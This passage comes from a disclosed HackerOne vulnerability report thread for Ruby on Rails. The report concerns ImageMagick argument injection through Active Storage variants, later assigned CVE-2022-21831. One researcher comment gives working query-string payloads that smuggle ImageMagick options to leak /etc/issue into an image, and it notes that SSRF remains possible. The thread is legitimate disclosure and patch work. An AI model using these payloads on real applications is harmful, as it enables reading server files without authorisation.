      "message": "Howdy @gquadros_,\n\nThanks for the followup.\n\nAttached are the revised patches. Anything new stand out in this case?\n\nWe made a usability tradeoff on allowing special characters in arguments. Along with this we could ship a recommended [security policy](https://imagemagick.org/script/security-policy.php) for imagemagick to account for edge cases.\n",
      "automated_response": false,
      "created_at": "2021-10-05T21:10:57.409Z",
      "updated_at": "2021-10-05T21:10:57.409Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1472297,
          "filename": "variant_processor_5_2.patch",
          "type": "text/x-diff",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lt6qwvswiku0fwg017sbroqj2rs4?response-content-disposition=attachment%3B%20filename%3D%22variant_processor_5_2.patch%22%3B%20filename%2A%3DUTF-8%27%27variant_processor_5_2.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065400Z&X-Amz-Expires=1454&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2381637cc5c7cee8e9ac8d6e9ab9450b03236cc9c685bba9c10868e29a57ab06"
        },
        {
          "id": 1472296,
          "filename": "variant_processor_rails_6.patch",
          "type": "text/x-diff",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t6vxl9m04ulw53qdzv3uva05w9lf?response-content-disposition=attachment%3B%20filename%3D%22variant_processor_rails_6.patch%22%3B%20filename%2A%3DUTF-8%27%27variant_processor_rails_6.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065400Z&X-Amz-Expires=1454&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b761db8b791d8ddf56ca6ac34f04235825dac2bcf2cc1c0243079c850636694"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 14000242,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @zack_spotify,\n\nwe had a look at the new patch and it is still possible to achieve SSRF as we talked above.\nAnother thing we realized is that it is possible to leak arbitrary file content.\n\nConsidering the following code:\n\n```ruby\n<%= image_tag blob.variant(params[:t] => params[:v]) %>\n```\n\nIf the original image is a GIF, we can leak by doing\n\n```\n?t=size&v[]=1x1&v[]=-depth&v[]=8&v[]=gray:/etc/issue\n?t=size&v[]=1x1&v[]=-depth&v[]=8&v[]=rgb:/etc/issue\n```\n\nand extracting the file content from the resulting image.\n\n\nIt is indeed hard to provide the API’s flexibility of passing arguments with arrays and to cover all the possible dangerous cases with block-lists. Maybe the improvements made so far combined with proper warnings about ImageMagick’s convert usage of arguments could be a good tradeoff. The developer using the variant()/preview() API should be aware of the danger and validate properly.\n\n\nRegards\n",
      "automated_response": false,
      "created_at": "2021-10-21T18:06:32.209Z",
      "updated_at": "2021-10-21T18:06:32.209Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 14131004,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for the followup!\n\n> Maybe the improvements made so far combined with proper warnings about ImageMagick’s convert usage of arguments could be a good tradeoff. \n\nAgreed, this patch strikes a balance between flexibility and safety so workarounds of varying degrees of impact are inevitable. With this, we also talked about the Rails team and the community building a good default for the ImageMagick policy XML file that we can either ship with Rails or somehow give to people.\n\nThe patch as is along with documentation and a safe default policy file would put us in a much better place than we are now.",
      "automated_response": false,
      "created_at": "2021-11-01T13:16:06.719Z",
      "updated_at": "2021-11-01T13:16:06.719Z",
      "actor": {
        "username": "zack_spotify",
        "cleared": false,
        "verified": false,
        "url": "/zack_spotify",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 14445153,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @zack_spotify, any update?",
      "automated_response": false,
      "created_at": "2021-11-25T18:51:13.405Z",
      "updated_at": "2021-11-25T18:51:13.405Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 14905311,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@rsilva thanks for your patience, I'm going to write a security notice and we'll ship the patches that @zack_spotify has attached.",
      "automated_response": false,
      "created_at": "2022-01-04T21:22:17.503Z",
      "updated_at": "2022-01-04T21:22:17.503Z",
      "actor": {
        "username": "tenderlove",
        "cleared": false,
        "verified": false,
        "url": "/tenderlove",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 14972877,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Ok  @tenderlove, thank you for the update.",
      "automated_response": false,
      "created_at": "2022-01-10T13:15:43.973Z",
      "updated_at": "2022-01-10T13:15:43.973Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 15775031,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi guys, any update?",
      "automated_response": false,
      "created_at": "2022-03-07T13:44:54.063Z",
      "updated_at": "2022-03-07T13:44:54.063Z",
      "actor": {
        "username": "rsilva",
        "cleared": false,
        "verified": false,
        "url": "/rsilva",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 16171374,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CveIdAdded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-04-05T20:25:40.284Z",
      "updated_at": "2022-04-05T20:25:40.284Z",
      "cve_ids": [
        "CVE-2022-21831"
      ],
      "actor": {
        "username": "tenderlove",
        "cleared": false,
        "verified": false,
        "url": "/tenderlove",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 16171375,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi, we've shipped this.  Thank you for reporting it!",
      "automated_response": false,
      "created_at": "2022-04-05T20:25:44.631Z",
      "updated_at": "2022-04-05T20:25:44.631Z",
      "actor": {
        "username": "tenderlove",
        "cleared": false,
        "verified": false,
        "url": "/tenderlove",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "gquadros_",
        "url": "/gquadros_"
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 22547995,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-06-28T00:45:10.293Z",
      "updated_at": "2023-06-28T00:45:10.293Z",
      "first_to_agree": true,
      "actor": {
        "username": "rafaelfranca",
        "cleared": false,
        "verified": false,
        "url": "/rafaelfranca",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    },
    {
      "id": 23043667,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2023-07-28T00:45:12.791Z",
      "updated_at": "2023-07-28T00:45:12.791Z",
      "actor": {
        "url": "/rails",
        "ibb": true,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Ruby on Rails"
        }
      },
      "genius_execution_id": null,
      "team_handle": "rails"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}